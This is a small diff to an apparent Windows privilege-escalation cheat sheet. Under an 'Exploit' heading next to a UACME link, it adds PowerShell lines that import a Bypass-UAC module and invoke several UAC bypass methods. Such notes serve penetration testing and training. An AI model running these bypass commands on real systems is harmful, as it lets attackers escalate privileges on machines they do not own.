@@ -286,6 +286,9 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 Exploit
 ```
 https://github.com/hfiref0x/UACME
+
+Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep|ucmDismMethod|UacMethodMMC2|UacMethodTcmsetup|UacMethodNetOle32
 ```
 ### Modifiable Service Executables
 ```
